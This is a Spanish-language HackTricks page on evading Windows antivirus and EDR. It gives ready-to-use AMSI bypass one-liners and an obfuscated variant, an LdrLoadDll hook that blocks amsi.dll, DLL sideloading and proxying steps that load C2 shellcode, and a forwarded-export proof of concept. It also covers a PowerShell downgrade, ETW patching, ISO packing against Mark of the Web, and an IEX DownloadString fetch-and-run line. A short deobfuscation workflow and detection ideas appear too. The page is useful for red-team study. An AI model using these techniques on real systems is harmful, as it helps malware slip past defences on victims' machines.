# Evasión de Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para detener Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para detener Windows Defender simulando otro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Actualmente, los AVs usan diferentes métodos para comprobar si un archivo es malicioso o no: static detection, dynamic analysis y, para los EDRs más avanzados, behavioural analysis.

### **Static detection**

La static detection se logra marcando cadenas conocidas o arreglos de bytes en un binario o script, y también extrayendo información del propio archivo (por ejemplo: file description, company name, digital signatures, icon, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten más fácilmente, ya que probablemente ya han sido analizadas y marcadas como maliciosas. Hay un par de formas de evitar este tipo de detección:

- **Encryption**

Si encriptas el binario, no habrá forma para que el AV detecte tu programa, pero necesitarás algún tipo de loader para desencriptar y ejecutar el programa en memory.

- **Obfuscation**

A veces todo lo que necesitas es cambiar algunas cadenas en tu binario o script para pasar por alto el AV, pero esto puede ser una tarea que consume mucho tiempo dependiendo de lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas conocidas-maliciosas, pero esto lleva mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la static detection de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente divide el archivo en múltiples segmentos y luego manda a Defender a escanear cada uno individualmente; de esta manera puede decirte exactamente cuáles son las cadenas o bytes marcados en tu binario.

Te recomiendo revisar esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctica.

### **Dynamic analysis**

La dynamic analysis es cuando el AV ejecuta tu binario en un sandbox y observa actividad maliciosa (por ejemplo: intentar desencriptar y leer las contraseñas del navegador, realizar un minidump en LSASS, etc.). Esta parte puede ser un poco más compleja, pero aquí hay algunas cosas que puedes hacer para evadir sandboxes.

- **Sleep before execution** Dependiendo de cómo esté implementado, puede ser una gran forma de evitar la dynamic analysis de los AVs. Los AVs tienen un tiempo muy corto para escanear archivos para no interrumpir el flujo de trabajo del usuario, así que usar sleeps largos puede perjudicar el análisis de binarios. El problema es que muchos sandboxes de AV simplemente pueden saltarse el sleep dependiendo de cómo esté implementado.
- **Checking machine's resources** Normalmente los Sandboxes tienen muy pocos recursos para trabajar (por ejemplo < 2GB RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo comprobando la temperatura de la CPU o incluso la velocidad de los ventiladores; no todo estará implementado en el sandbox.
- **Machine-specific checks** Si quieres apuntar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que especificaste; si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre del equipo del Sandbox de Microsoft Defender es HAL9TH, así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a los Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como hemos dicho antes en este post, **public tools** eventualmente **get detected**, así que debes hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, ¿**realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también haga el volcado de LSASS?

La respuesta correcta probablemente sea lo segundo. Tomando mimikatz como ejemplo, probablemente sea una de las herramientas, si no la más, marcadas por AVs y EDRs; aunque el proyecto en sí es muy bueno, también es una pesadilla trabajar con él para evadir AVs, así que busca alternativas para lo que intentas lograr.

> [!TIP]
> Cuando modifiques tus payloads para evadir detecciones, asegúrate de **desactivar el envío automático de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si quieres comprobar si tu payload es detectado por un AV en particular, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo ahí hasta que estés satisfecho con el resultado.

## EXEs vs DLLs

Siempre que sea posible, **prioriza usar DLLs para la evasión**; en mi experiencia, los archivos DLL suelen ser **mucho menos detectados** y analizados, así que es un truco muy simple para evitar detección en algunos casos (si tu payload tiene alguna forma de ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un Payload DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el DLL search order usado por el loader posicionando tanto la aplicación víctima como los payload(s) maliciosos uno al lado del otro.

Puedes comprobar programas susceptibles a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explore DLL Hijackable/Sideloadable programs yourself**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas públicamente conocidos como DLL Sideloadable, puedes ser detectado fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar no hará que cargue tu payload, ya que el programa espera funciones específicas dentro de esa DLL; para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo manejar la ejecución de tu payload.

Voy a usar el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
El último comando nos dará 2 archivos: una plantilla de código fuente de la DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la DLL proxy tienen una tasa de detección 0/26 en [antiscan.me](https://antiscan.me)! Lo llamaría un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Recomiendo **encarecidamente** que veas [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender más en profundidad sobre lo que hemos discutido.

### Abusar de Exportaciones reenviadas (ForwardSideLoading)

Los módulos Windows PE pueden exportar funciones que en realidad son "forwarders": en lugar de apuntar a código, la entrada de exportación contiene una cadena ASCII con la forma `TargetDll.TargetFunc`. Cuando un invocador resuelve la exportación, el loader de Windows hará:

- Cargar `TargetDll` si no está ya cargado
- Resolver `TargetFunc` desde él

Comportamientos clave a tener en cuenta:
- Si `TargetDll` es un KnownDLL, se suministra desde el espacio de nombres protegido KnownDLLs (p. ej., ntdll, kernelbase, ole32).
- Si `TargetDll` no es un KnownDLL, se usa el orden normal de búsqueda de DLLs, que incluye el directorio del módulo que realiza la resolución del forward.

Esto habilita una primitiva de sideloading indirecta: encuentra una DLL firmada que exporte una función reenviada a un nombre de módulo que no sea KnownDLL, luego coloca esa DLL firmada en el mismo directorio junto con una DLL controlada por el atacante con el nombre exacto del módulo objetivo reenviado. Cuando se invoque la exportación reenviada, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.

Ejemplo observado en Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` no es un KnownDLL, por lo que se resuelve mediante el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copia la DLL del sistema firmada en una carpeta escribible
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un `DllMain` mínimo es suficiente para obtener ejecución de código; no necesitas implementar la función reenviada para activar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Disparar el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamiento observado:
- rundll32 (signed) carga el side-by-side `keyiso.dll` (signed)
- Mientras resuelve `KeyIsoSetAuditingInterface`, el loader sigue el reenvío a `NCRYPTPROV.SetAuditingInterface`
- El loader entonces carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementada, obtendrás un error de "missing API" solo después de que `DllMain` ya se haya ejecutado

Hunting tips:
- Céntrate en forwarded exports donde el módulo objetivo no sea un KnownDLL. KnownDLLs están listados bajo `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar forwarded exports con tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideas de detección/defensa:
- Monitorea LOLBins (p. ej., rundll32.exe) que cargan DLLs firmadas desde rutas no pertenecientes al sistema, seguidas de la carga de non-KnownDLLs con el mismo nombre base desde ese directorio
- Alerta sobre cadenas de procesos/módulos como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` en rutas escribibles por el usuario
- Aplica políticas de integridad de código (WDAC/AppLocker) y deniega escritura+ejecución en los directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es solo un juego de gato y ratón: lo que funciona hoy podría detectarse mañana, así que nunca confíes en una sola herramienta; si es posible, intenta encadenar múltiples técnicas de evasión.

## AMSI (Anti-Malware Scan Interface)

AMSI fue creado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, los AVs solo podían escanear archivos en disco, por lo que si de alguna manera podías ejecutar payloads directamente in-memory, el AV no podía hacer nada para prevenirlo, ya que no tenía suficiente visibilidad.

La funcionalidad AMSI está integrada en estos componentes de Windows.

- User Account Control, or UAC (elevación de EXE, COM, MSI, o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Office VBA macros

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts exponiendo el contenido de los mismos en una forma no cifrada y no ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Fíjate cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aun así fuimos detectados in-memory debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar ejecución in-memory. Por eso se recomienda usar versiones inferiores de .NET (como 4.7.2 o anteriores) para ejecución in-memory si quieres evadir AMSI.

Hay un par de formas de evitar AMSI:

- **Obfuscation**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena manera de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que la obfuscation podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque, a veces, todo lo que necesitas es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto haya sido marcado algo.

- **AMSI Bypass**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente incluso ejecutando como un usuario sin privilegios. Debido a este fallo en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forcing an Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) dará como resultado que no se inicie ningún escaneo para el proceso actual. Originalmente esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para prevenir un uso más amplio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Todo lo que hizo falta fue una línea de código powershell para dejar AMSI inutilizable para el proceso powershell actual. Esta línea, por supuesto, fue detectada por AMSI, por lo que se necesita alguna modificación para poder usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Ten en cuenta que esto probablemente será detectado una vez que se publique esta entrada, así que no deberías publicar ningún código si tu plan es permanecer sin ser detectado.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones que devuelvan el código E_INVALIDARG; de este modo, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

> [!TIP]
> Por favor lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.

También hay muchas otras técnicas usadas para bypass AMSI con powershell; consulta [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI se inicializa solo después de que `amsi.dll` se cargue en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en colocar un hook en modo usuario sobre `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan escaneos para ese proceso.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona en PowerShell, WScript/CScript y loaders personalizados por igual (cualquier cosa que de otro modo cargaría AMSI).
- Combínalo con alimentar scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha visto usado por loaders ejecutados a través de LOLBins (p. ej., `regsvr32` llamando a `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) también genera scripts para eludir AMSI.

**Remove the detected signature**

Puedes usar una herramienta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma AMSI detectada de la memoria del proceso actual. Esta herramienta funciona escaneando la memoria del proceso actual en busca de la firma AMSI y luego sobrescribiéndola con instrucciones NOP, eliminándola efectivamente de la memoria.

**AV/EDR products that uses AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si usas PowerShell versión 2, AMSI no se cargará, por lo que puedes ejecutar tus scripts sin que AMSI los escanee. Puedes hacer esto:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging es una función que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para auditoría y resolución de problemas, pero también puede ser un **problema para atacantes que quieren evadir la detección**.

Para evadir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Use Powershell version 2**: Si usas PowerShell versión 2, AMSI no se cargará, así que puedes ejecutar tus scripts sin que AMSI los escanee. Puedes hacerlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para generar un powershell sin defensas (esto es lo que `powerpick` from Cobal Strike usa).


## Obfuscation

> [!TIP]
> Varias técnicas de ofuscación dependen de cifrar datos, lo que aumentará la entropía del binario y facilitará que los AVs y EDRs lo detecten. Ten cuidado con esto y quizá aplica cifrado solo a secciones específicas de tu código que sean sensibles o necesiten ocultarse.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Al analizar malware que usa ConfuserEx 2 (o forks comerciales) es común encontrarse con varias capas de protección que bloquearán decompiladores y sandboxes. El flujo de trabajo a continuación restaura de forma fiable un IL casi original que luego puede ser decompilado a C# en herramientas como dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto del conjunto de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer mayor seguridad del software mediante code obfuscation y tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, obfuscated code sin usar ninguna herramienta externa y sin modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de obfuscated operations generadas por el C++ template metaprogramming framework que hará la vida de la persona que quiera crackear la aplicación un poco más difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un x64 binary obfuscator que es capaz de obfuscate varios diferentes pe files incluyendo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame es un simple metamorphic code engine para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un fine-grained code obfuscation framework para lenguajes soportados por LLVM que usa ROP (return-oriented programming). ROPfuscator obfuscates un programa a nivel de código assembly transformando instrucciones regulares en ROP chains, frustrando nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is a .NET PE Crypter written in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobando el Zone.Identifier ADS para un archivo descargado de Internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **trusted** **no activarán SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Ejemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **log events**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

Similar to how AMSI is disabled (bypassed) también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar ningún evento. Esto se consigue parcheando la función en memoria para que retorne de inmediato, deshabilitando efectivamente el logging de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory es una técnica conocida desde hace tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblados C# directamente en memoria, pero hay diferentes formas de hacerlo:

- **Fork\&Run**

Consiste en **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar el código malicioso y, cuando termine, matar el nuevo proceso. Esto tiene tanto ventajas como desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro Beacon implant process. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implant sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **detecciones de comportamiento**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De esta manera, puedes evitar crear un nuevo proceso y que este sea escaneado por el AV, pero la desventaja es que si algo falla durante la ejecución de tu payload, hay una **mucho mayor probabilidad** de **perder tu beacon** ya que podría causar un crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre C# Assembly loading, revisa este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **from PowerShell**, mira [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el video de S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Como propone [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno intérprete instalado en el Attacker Controlled SMB share**.

Al permitir el acceso a los Interpreter Binaries y al entorno en el SMB share puedes **execute arbitrary code in these languages within memory** de la máquina comprometida.

El repositorio indica: Defender todavía escanea los scripts pero, al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evadir firmas estáticas**. Las pruebas con reverse shells aleatorios sin ofuscar en estos lenguajes han resultado exitosas.

## TokenStomping

